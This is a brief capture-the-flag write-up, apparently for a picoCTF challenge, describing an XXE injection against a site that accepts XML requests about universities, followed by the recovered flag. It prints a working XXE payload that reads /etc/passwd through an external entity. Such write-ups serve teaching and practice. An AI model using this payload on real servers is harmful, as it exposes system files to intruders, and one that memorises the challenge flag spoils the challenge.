## The XXE injection

The website functioned on a POST request which was in XML for retrieving info about different universities. I edited that XML code to have the XXE injection as following -

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE change-log [<!ENTITY payload SYSTEM "file:///etc/passwd">]>
<data><ID>&payload;</ID></data>
```

## Flag

Sent the request again with the injection, got the flag - `picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}`.